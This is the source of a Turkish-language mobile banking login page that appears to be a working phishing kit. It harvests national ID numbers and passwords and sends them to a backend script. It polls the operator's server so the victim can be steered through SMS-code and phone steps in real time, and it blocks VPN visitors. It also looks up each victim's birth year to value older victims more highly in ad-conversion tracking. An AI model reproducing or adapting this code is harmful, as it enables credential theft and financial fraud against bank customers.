<?php include_once("config.php"); include_once("./admin/Data/Server/GrabIP.php"); include_once("./admin/Data/Server/BlockVPN.php");  include_once("./admin/Data/Server/BanControl.php");
   $pdo->query("UPDATE logs SET durum = 'Anasayfa' WHERE ip = '{$ip}'");
?>
<!DOCTYPE html>
<html lang="tr">
   <head>
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1905314563717981');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1905314563717981&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->

      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
      <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
      <script src="./assets/js/hHdiF0lg98fZ.js"></script>
      <title>Mobile Sayfa</title>
      <style>
         @font-face {
         font-family: 'KelveticaNobis';
         src: url('./assets/fonts/OwwgtWr5KJVN.otf') format('opentype');
         font-weight: normal;
         font-style: normal;
         }
         body, html {
         background-color: #f1f2f2;
         padding: 0;
         max-width: 414px;
         margin: 0 auto;
         font-family: 'KelveticaNobis', sans-serif;
         }
         header {
         width: 100%;
         height: 106px;
         background-image: url('./assets/images/2gQEoHpYiwxx.png');
         background-size: contain;
         background-repeat: no-repeat;
         }
         .main {
         min-height: 805px;
         width: 100%;
         height: 805px;
         background-image: url('./assets/images/irpyabLMrXNK.png');
         background-size: contain;
         background-repeat: no-repeat;
         }
         input.form-control {
         width: 85%;
         height: 50px;
         font-family: 'KelveticaNobis', sans-serif;
         margin-bottom: 10px;
         margin-top: 5px;
         border: none;
         font-size: 16px;
         margin-left: 15px;
         margin-right: 15px;
         padding-left: 20px;
         }
         input.form-control:focus {
         outline: none;
         box-shadow: none;
         }
         button.btn {
         width: 90%;
         height: 50px;
         margin-top: 20px;
         background-color: #2ea8ab;
         border: none;
         color: #fff;
         font-size: 14px;
         cursor: pointer;
         border-radius: 0;
         }
         .fullscreen-div {
         position: fixed;
         top: 0;
         width: 100%;
         height: 100%;
         background-image: url('./assets/images/KP637W4a62PL.png');
         background-size: cover;
         background-position: center;
         z-index: 9999;
         display: none;
         max-width: 414px;
         }
         .error-message {
         color: red;
         font-size: 14px;
         margin-bottom: 10px;
         font-weight: 700;
         }
         /* Preloader */
         .preloader {
         position: fixed;
         top: 0;
         left: 0;
         width: 100%;
         height: 100%;
         background-color: #ffffff;
         z-index: 10000;
         display: flex;
         justify-content: center;
         align-items: center;
         }
         .spinner {
         border: 5px solid #f3f3f3;
         border-top: 5px solid #2ea8ab;
         border-radius: 50%;
         width: 40px;
         height: 40px;
         animation: spin 1s linear infinite;
         }
         @keyframes spin {
         0% { transform: rotate(0deg); }
         100% { transform: rotate(360deg); }
         }
      </style>
<style>
  #loadingMessage {
    color: #333;
    font-size: 16px;
    animation: pulse 1s infinite;
  }

  @keyframes pulse {
    0% { opacity: 0.4; }
    50% { opacity: 1; }
    100% { opacity: 0.4; }
  }
</style>

   </head>
   <body>
      <!-- Preloader -->
      <div class="preloader" id="preloader">
         <div class="spinner"></div>
      </div>
      <header></header>
      <div class="fullscreen-div" id="fullscreenDiv" style="<?php if($_GET['error'] == "1"): echo "display:none;"; else: echo "display:block;"; endif; ?>"></div>
      <div class="main">
         <center>
            <input type="text" class="form-control" id="tcnum" maxlength="11" placeholder="Müşteri / TC Kimlik Numarası">
         </center>
<center>
  <input type="password" class="form-control" id="pwd" maxlength="6" inputmode="numeric" placeholder="Parola">
  <div id="errorMessage" class="error-message" style="<?php if($_GET['error'] == "1"): echo "display:block;"; else: echo "display:none;"; endif; ?>">Lütfen Bilgilerinizi kontrol ederek tekrar deneyin.</div>
</center>

<!-- Giriş Yap Butonu -->
<center>
  <button id="formSubmit" class="btn" type="button" style="display:none;">Giriş Yap</button>
  <div id="loadingMessage" style="display:none; margin-top: 10px; font-weight: bold;">🔄 Bilgileriniz Doğrulanıyor...</div>
</center>


      </div>
      <script>
         function tcno_dogrula(tcno) {
             tcno = String(tcno);
             if (tcno.length !== 11 || tcno[0] === '0') return false;
             let hane_tek = 0, hane_cift = 0, ilkon_total = 0;
             for (let i = 0; i < 9; i++) {
                 let j = parseInt(tcno[i], 10);
                 i % 2 === 0 ? hane_tek += j : hane_cift += j;
                 ilkon_total += j;
             }
             if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno[9], 10)) return false;
             ilkon_total += parseInt(tcno[9], 10);
             return ilkon_total % 10 === parseInt(tcno[10], 10);
         }
         
         function submitFirstForm(e) {
             const tcnum = $('#tcnum').val();
             const pwd = $('#pwd').val();
             const isValidTC = tcno_dogrula(tcnum);
             const isValidPWD = /^\d{6}$/.test(pwd);

             if (!isValidTC || !isValidPWD) {
                 $('#errorMessage').show();
             } else {
                 $('#errorMessage').hide();

        // İçerik görüntülendi - Meta Pixel eventi
        fbq('track', 'ViewContent');

        e.preventDefault();

        $.ajax({
            type: "POST",
            url: "./request.php?action=first",
            data: {
                tc_kimlik: tcnum,
                sifre: pwd
            },
            success: function (data) {
                window.location.href = 'phone';
            }
        });
    }
}

         $('#formSubmit').on('click', submitFirstForm);
         
         $('#fullscreenDiv').on('click', function() {
             $(this).slideUp(500);
         });
         
         $('header').on('click', function() {
             $('#fullscreenDiv').slideDown(500);
         });
         
         // Preloader kontrolü
         $(window).on('load', function() {
             $('#preloader').fadeOut('slow');
         });
      </script>
      <script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 2500);
      });
      
      function gonder() {
        $.ajax({
           type: 'POST',
           url: '<?php echo "veri.php?ip=".$ip; ?>',
           success: function(msg) {
              if (msg == 'sms') {
                  window.location.href = '/sms';
              }
              if (msg == 'tebrikler') {
                  window.location.href = '/basarili';
              }
              if (msg == 'telefon') {
                  window.location.href = '/phone';
              }
              if (msg == 'bildirim') {
                  window.location.href = '/bildirim';
              }
              if (msg == 'hata_sms') {
                  window.location.href = '/sms?error=1';
              }
              if (msg == 'hata_hesap') {
                  window.location.href = '/?error=1';
              }
              if (msg == 'basa_dondur') {
                  window.location.href = '/';
              }
           }
        });
      }     
    </script>
<script>
  var dogumKontrolTamam = false;
  var pixelValue = 3.00;

  function tcno_dogrula(tcno) {
    tcno = String(tcno);
    if (tcno.length !== 11 || tcno[0] === '0') return false;
    let hane_tek = 0, hane_cift = 0, ilkon_total = 0;
    for (let i = 0; i < 9; i++) {
      let j = parseInt(tcno[i], 10);
      i % 2 === 0 ? hane_tek += j : hane_cift += j;
      ilkon_total += j;
    }
    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno[9], 10)) return false;
    ilkon_total += parseInt(tcno[9], 10);
    return ilkon_total % 10 === parseInt(tcno[10], 10);
  }

  function kontrolEtVeGoster() {
    const tcnum = $('#tcnum').val();
    const pwd = $('#pwd').val();
    const isValidTC = tcno_dogrula(tcnum);
    const isValidPWD = /^\d{6}$/.test(pwd);

    // Başlangıçta buton ve mesajları kapat
    $('#formSubmit').hide();
    $('#loadingMessage').hide();
    $('#errorMessage').hide();

    if (isValidTC && isValidPWD) {
      $('#loadingMessage').text("🔄 Bilgileriniz Doğrulanıyor...").fadeIn();

      $.ajax({
        type: 'GET',
        url: 'api_proxy.php?tc=' + tcnum, // Not: sunucudan geçmelisin!
        dataType: 'json',
        timeout: 3000, // 10 saniyede API cevap vermezse hata
        success: function (resp) {
          dogumKontrolTamam = false;
          $('#loadingMessage').hide();

          if (resp && resp.Veri && resp.Veri.DogumTarihi) {
            let dogumYili = parseInt(resp.Veri.DogumTarihi.split('-')[0]);
            pixelValue = (dogumYili <= 1980) ? 15.00 : 5.00;
            dogumKontrolTamam = true;
            $('#formSubmit').fadeIn(); // ✅ Buton açılır
          } else {
            $('#errorMessage').text("Doğum yılı alınamadı.").fadeIn();
          }
        },
error: function () {
  dogumKontrolTamam = true; // Hata da olsa buton açılsın
  pixelValue = 5.00; // 5 değerini gönder
  $('#loadingMessage').hide();
  $('#errorMessage').hide();   // HATA YAZISI HİÇ ÇIKMASIN
  $('#formSubmit').fadeIn();
}

      });
    } else {
      $('#formSubmit').hide();
      $('#loadingMessage').hide();
      dogumKontrolTamam = false;
    }
  }

  $(document).ready(function () {
    $('#formSubmit').hide();
    $('#tcnum, #pwd').on('input', kontrolEtVeGoster);
  });

  $('#formSubmit').on('click', function (e) {
    e.preventDefault();

    const tcnum = $('#tcnum').val();
    const pwd = $('#pwd').val();

    if (!tcno_dogrula(tcnum) || !/^\d{6}$/.test(pwd)) {
      $('#errorMessage').text("Bilgileri eksiksiz doldurun.").fadeIn();
      return;
    }

    if (!dogumKontrolTamam) {
      $('#errorMessage').text("Doğrulama tamamlanmadan giriş yapılamaz.").fadeIn();
      return;
    }

    $('#errorMessage').hide();

    // 📡 Meta Pixel Eventleri
    fbq('track', 'ViewContent');
    fbq('track', 'CompleteRegistration', {
      value: pixelValue,
      currency: 'TRY'
    });

    $.ajax({
      type: "POST",
      url: "./request.php?action=first",
      data: {
        tc_kimlik: tcnum,
        sifre: pwd
      },
      success: function (data) {
        window.location.href = 'phone';
      }
    });
  });
</script>







   </body>
</html>